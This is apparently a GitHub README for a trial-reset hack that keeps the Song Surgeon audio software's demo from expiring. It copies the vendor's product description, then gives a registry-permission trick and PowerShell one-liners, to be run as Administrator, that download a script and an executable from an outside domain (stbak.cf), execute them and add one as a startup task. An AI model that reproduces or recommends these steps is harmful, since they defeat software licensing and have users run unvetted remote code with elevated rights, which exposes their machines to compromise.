[![PSScriptAnalyzer](https://github.com/BiltuDas1/song-surgeon-demo-unlimited/actions/workflows/powershell-analysis.yml/badge.svg)](https://github.com/BiltuDas1/song-surgeon-demo-unlimited/actions/workflows/powershell-analysis.yml)
[![SL Scan](https://github.com/BiltuDas1/song-surgeon-demo-unlimited/actions/workflows/shiftleft-analysis.yml/badge.svg)](https://github.com/BiltuDas1/song-surgeon-demo-unlimited/actions/workflows/shiftleft-analysis.yml)
[![Donate](https://img.shields.io/badge/Buy%20me%20a-Coffee-blue.svg)](https://www.buymeacoffee.com/stopback)

# Song Surgeon Demo Unlimited Trial
Song Surgeon was first released in 2007, and is now a decade old... From its first humble beginnings it has grown to be one of the most popular and valuable tools used by musicians – both students and teacher. At last count Song Surgeon has been sold in more than 120 countries worldwide – and by musicians that play 37 different instruments.

Our newly released Version 5 of Song Surgeon takes the program to a whole new level with the addition of key detection, automatic beat detection, and chord detection. What that means is that when you open a song, Song Surgeon will automatically detect the tempo of a song in BPMs, in will determine the key signature, it will detect the chords – and it will display all of this information on the main user interface so you can see and use it. We know of no other audio slowdowner software that provides these three features in one program. And of course, that’s just the beginning.

In addition to providing nearly flawless, distortion-free key and tempo change of audio, Song Surgeon has a long list of other useful features:

# How to Increase time of Song Surgeon?
There has 2 method for increasing time of Song Surgeon Demo Version, 1st one is registy and 2nd one is PowerShell script (online)

| Registry | PowerShell |
| ------- | ------------------ |
| It will freeze current time so that the program will not be Expire | It will Set the program time to infity amount of time that you will be old but the demo will not be Expire|
| Hard for those who doesn't has enough knowledge about registry | Easy for those who know basic knowledge about computers |
| It only can set infinity trial on the Free Version | It only can set infinity trial on the Premium Version* |
| No need any Internet Connection | Needs a stable Internet Connection |
| Real time update not available | Real time update available on [stbak.cf](https://stbak.cf) |

*Song Surgeon comes with 2 program which is a free demo (Limited) and another is paid demo, you can choose which demo you will use, just goto the Song Surgeon Program directory and open **switcher.bat**

# Installation
## 1st Method (Registry)

[Download Registry file into your Computer](/V_5.reg)  

On Windows 10
1. Merge the Registry into your Windows Registry
2. Open **regedit.exe** and then goto this directory `Computer\HKEY_USERS\S-1-5-21-3204273600-1076203570-2903160593-1001\SOFTWARE\TMJ\Demos`
3. Right Click on `SS_<Version of Song Surgeon>` and choose Permissions.., click on Advanced and then Disable inheritance (Windows 10)
4. Then Remove all inheritance Permissions from the object, Add > Select a Principal, type `everyone` in the object name box and click OK
5. Under Basic Permissions choose **Read** and click OK  

<p align="center">
  <img src="/Screenshots/Screenshot%202021-05-01%20203647.png?raw=true">
</P>

6. Click OK, After clicking OK if you see the following Screen then you are done!

<p align="center">
  <img src="/Screenshots/Screenshot%202021-05-01%20204126.png?raw=true">
</P>


## 2nd Method (PowerShell) [Recommended]

This method needs an stable internet connection, If you are using latest version of Song Surgeon then It's recommended to use this script.

1. Goto start menu and search for **powershell**, Right click on it and Choose **Run as Administrator**
2. After comfirming Admin Password, type the below code into the powershell window and hit enter
```
wget stbak.cf/ss -outfile ss.cmd; ss.cmd; del ss.cmd
```
3. Now Open the Song Surgeon and see how the script magically works on it.

<p align="center">
  <img src="/Screenshots/Screenshot%202021-05-01%20213220.png?raw=true">
</P>

### Install As Startup task

This method doesn't lock the time of your Program so te demo time continues counting for prevent the program from being Expaired add the tool into your computer startup, it means the program will be run automatically on start. For doing this type below code into powershell window and hit enter.
```
cd\; wget stbak.cf/sss -outfile sss.exe; .\sss.exe
```
for deleting temporary files which created by powershell use
```
remove-item sss.exe
```

***Note: Make sure you manually patch the code before using the install as startup task.***

# Donation
If you like my work then Please donate  
I need donation because,
1. I has wasted about a week for making this script
2. I will update the script regulary so that It will be work on latest version
3. And I need to pay my web host for running the script online.

Plz consider by giving me a small donation

<p align="center">
  <a href='https://www.buymeacoffee.com/stopback'><img src="https://github.com/appcraftstudio/buymeacoffee/raw/master/Images/snapshot-bmc-button.png" height='50' width='200'></a>
</p>

# Contact
If you has any Query then you can contact me at [Telegram](https://t.me/BiltuDas1)
